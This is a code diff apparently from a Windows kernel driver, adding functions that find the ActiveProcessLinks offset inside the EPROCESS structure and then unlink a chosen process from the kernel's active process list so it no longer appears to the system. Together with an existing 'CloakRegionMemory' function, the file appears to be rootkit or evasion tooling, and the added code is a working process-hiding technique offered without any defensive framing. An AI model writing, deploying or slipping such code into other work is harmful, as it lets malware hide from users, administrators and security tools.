@@ -2514,3 +2514,66 @@ NTSTATUS CloakRegionMemory(PEPROCESS Process, ULONG64 VirtualAddress, PVOID Buff
 
 	return (written == Size) ? STATUS_SUCCESS : STATUS_PARTIAL_COPY;
 }
+
+ULONG ResolveActiveProcessLinksOffset(void)
+{
+	static ULONG g_ActiveProcessLinksOffset = 0;
+	if (g_ActiveProcessLinksOffset != 0)
+		return g_ActiveProcessLinksOffset;
+
+	PEPROCESS currentProc = IoGetCurrentProcess();
+	HANDLE currentPid = PsGetCurrentProcessId();
+
+	if (currentProc && currentPid)
+	{
+		PUCHAR p = (PUCHAR)currentProc;
+		for (ULONG off = 0x200; off <= 0x600; off += sizeof(ULONG_PTR))
+		{
+			if (*(PHANDLE)(p + off) == currentPid)
+			{
+				ULONG linksOff = off + sizeof(HANDLE);
+				PLIST_ENTRY list = (PLIST_ENTRY)(p + linksOff);
+				if (MmIsAddressValid(list->Flink) && MmIsAddressValid(list->Blink))
+				{
+					g_ActiveProcessLinksOffset = linksOff;
+					return linksOff;
+				}
+			}
+		}
+	}
+
+	g_ActiveProcessLinksOffset = 0x448; // Default Win10/Win11 x64
+	return 0x448;
+}
+
+NTSTATUS HideProcessByPid(ULONG ProcessId)
+{
+	if (KeGetCurrentIrql() > APC_LEVEL)
+		return STATUS_UNSUCCESSFUL;
+
+	PEPROCESS proc = NULL;
+	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)(UINT_PTR)ProcessId, &proc)) || !proc)
+		return STATUS_NOT_FOUND;
+
+	ULONG linksOffset = ResolveActiveProcessLinksOffset();
+	PLIST_ENTRY links = (PLIST_ENTRY)((PUCHAR)proc + linksOffset);
+
+	__try
+	{
+		if (links->Flink && links->Blink && links->Flink != links)
+		{
+			links->Blink->Flink = links->Flink;
+			links->Flink->Blink = links->Blink;
+			links->Flink = links;
+			links->Blink = links;
+		}
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		ObDereferenceObject(proc);
+		return STATUS_UNHANDLED_EXCEPTION;
+	}
+
+	ObDereferenceObject(proc);
+	return STATUS_SUCCESS;
+}
